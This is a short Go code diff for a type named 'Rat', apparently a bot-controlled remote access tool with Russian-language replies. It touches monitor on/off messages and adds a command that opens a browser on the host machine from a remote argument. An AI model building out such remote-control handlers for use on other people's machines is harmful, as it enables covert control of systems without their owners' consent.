@@ -72,10 +72,10 @@ func (r *Rat) monitorCmd(args string) {
 
 	switch args {
 	case "on":
-		r.Bot.Send("Монитор включен")
+		r.Bot.Send("Монитор включен.")
 		return
 	case "off":
-		r.Bot.Send("Монитор выключен")
+		r.Bot.Send("Монитор выключен.")
 		return
 	}
 }
@@ -102,4 +102,14 @@ func (r *Rat) keyboardCmd(args string) {
 	}
 
 	r.Bot.Send("Успешно выполнено!")
+}
+
+func (r *Rat) browserCmd(args string) {
+	err := r.Engine.Media.OpenBrowser(args)
+	if err != nil {
+		r.Bot.Send("Ошибка: %v", err)
+		return
+	}
+
+	r.Bot.Send("Браузер успешно открыт.")
 }
